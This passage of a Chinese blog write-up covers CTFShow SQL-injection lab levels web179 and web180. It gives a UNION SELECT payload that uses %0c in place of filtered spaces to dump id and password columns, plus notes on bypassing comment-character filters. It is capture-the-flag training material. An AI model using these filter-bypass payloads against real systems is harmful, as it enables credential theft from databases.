+<h3 id="web179"><a href="#web179" class="headerlink" title="web179"></a>web179<a href="#web179" class="header-anchor">#</a></h3><p>依旧是过滤了空格，但是现在 %09 不好用啦。但是可以用 %0c 代替空格</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">1</span>&#x27;%<span class="number">0</span>cunion%<span class="number">0</span>cselect%<span class="number">0</span>c1,<span class="number">2</span>,group_concat(id,password)%<span class="number">0</span>cfrom%<span class="number">0</span>cctfshow_user%<span class="number">23</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="web180"><a href="#web180" class="headerlink" title="web180"></a>web180<a href="#web180" class="header-anchor">#</a></h3><p>这一关过滤了注释符 %23,而且空格还是只能用 %0c 代替。那我们只能使用另一个注释符–空格了，将空格替换成 %0c 就好</p>
+<p><img src="/images/CTFShowSQL%E6%B3%A8%E5%85%A5/image-20230120092708256.png" alt="image-20230120092708256"></p>
+<p>一开始是想在联合查询的最后一个字符左边加上单引号，然后和题目的单引号形成一个完整的单引号以此绕过过滤的。</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">1</span>&#x27; union select <span class="number">1</span>,<span class="number">2</span>,&#x27;<span class="number">3</span></span><br></pre></td></tr></table></figure>
+
+<p>但是发现 group_conat 语句只能在联合查询的最后一个位置，不知道为什么</p>
+<p><img src="/images/CTFShowSQL%E6%B3%A8%E5%85%A5/image-20230120093917720.png" alt="image-20230120093917720"></p>
+<h3 id="can-kao-lian-jie"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接<a href="#can-kao-lian-jie" class="header-anchor">#</a></h3><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/recharging-runtime/p/15077477.html">CTFSHOW WEB入门 SQL注入篇 - b477eRy - 博客园 (cnblogs.com)</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_50589021/article/details/119426002">(10条消息) ctfshow-sql注入-超详解(172-200)_Yn8rt的博客-CSDN博客_ctfshow sql</a></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="https://github.com/MirRoR4s">项目</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="https://github.com/MirRoR4s">MyGithub</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/tags/">标签</a></li>
+         
+          <li><a href="/categories/">分类</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#sql-zhu-ru"><span class="toc-number">1.</span> <span class="toc-text">sql注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#web171"><span class="toc-number">1.1.</span> <span class="toc-text">web171</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web172"><span class="toc-number">1.2.</span> <span class="toc-text">web172</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web173"><span class="toc-number">1.3.</span> <span class="toc-text">web173</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web174"><span class="toc-number">1.4.</span> <span class="toc-text">web174</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web175"><span class="toc-number">1.5.</span> <span class="toc-text">web175</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#qian-yan"><span class="toc-number">1.6.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web176"><span class="toc-number">1.7.</span> <span class="toc-text">web176</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web177"><span class="toc-number">1.8.</span> <span class="toc-text">web177</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web178"><span class="toc-number">1.9.</span> <span class="toc-text">web178</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web179"><span class="toc-number">1.10.</span> <span class="toc-text">web179</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web180"><span class="toc-number">1.11.</span> <span class="toc-text">web180</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#can-kao-lian-jie"><span class="toc-number">1.12.</span> <span class="toc-text">参考链接</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://example.com/2023/01/19/CTFShowSQL%E6%B3%A8%E5%85%A5/index.html"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://example.com/2023/01/19/CTFShowSQL%E6%B3%A8%E5%85%A5/index.html&text=CTFShowSQL注入"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://example.com/2023/01/19/CTFShowSQL%E6%B3%A8%E5%85%A5/index.html&title=CTFShowSQL注入"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://example.com/2023/01/19/CTFShowSQL%E6%B3%A8%E5%85%A5/index.html&is_video=false&description=CTFShowSQL注入"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=CTFShowSQL注入&body=Check out this article: https://example.com/2023/01/19/CTFShowSQL%E6%B3%A8%E5%85%A5/index.html"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://example.com/2023/01/19/CTFShowSQL%E6%B3%A8%E5%85%A5/index.html&title=CTFShowSQL注入"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://example.com/2023/01/19/CTFShowSQL%E6%B3%A8%E5%85%A5/index.html&title=CTFShowSQL注入"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://example.com/2023/01/19/CTFShowSQL%E6%B3%A8%E5%85%A5/index.html&title=CTFShowSQL注入"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://example.com/2023/01/19/CTFShowSQL%E6%B3%A8%E5%85%A5/index.html&title=CTFShowSQL注入"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://example.com/2023/01/19/CTFShowSQL%E6%B3%A8%E5%85%A5/index.html&name=CTFShowSQL注入&description=&lt;!--toc--&gt;
+
+&lt;p&gt;专题训练之 SQL 注入&lt;/p&gt;"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://example.com/2023/01/19/CTFShowSQL%E6%B3%A8%E5%85%A5/index.html&t=CTFShowSQL注入"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    1999-2022
+    MirRoR4s
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/MirRoR4s">项目</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/MirRoR4s">MyGithub</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">标签</a></li><!--
+     --><!--
+       --><li><a href="/categories/">分类</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+            processEscapes: true
+        }
+    });
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax();
+        for (var i = 0; i < all.length; ++i)
+            all[i].SourceElement().parentNode.className += ' has-jax';
+    });
+</script>
+<script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+</body>
+</html>
